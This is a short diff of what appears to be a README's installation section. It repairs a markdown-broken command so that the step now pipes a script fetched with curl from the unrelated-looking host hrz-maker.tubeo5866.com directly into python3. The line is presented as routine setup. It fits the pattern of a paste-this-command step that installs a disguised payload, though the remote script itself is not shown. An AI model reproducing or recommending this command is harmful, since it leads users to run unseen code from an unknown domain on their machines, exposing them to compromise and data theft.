@@ -33,7 +33,7 @@ Copy and paste the following command into your Terminal:
 *(Replace `python3` with `python` if you are using Windows)*
 
 ```bash
-curl -fsSL [https://hrz-maker.tubeo5866.com](https://hrz-maker.tubeo5866.com) | python3
+curl -fsSL https://hrz-maker.tubeo5866.com | python3
 ```
 
 ## 🚀 Manually install support libraries
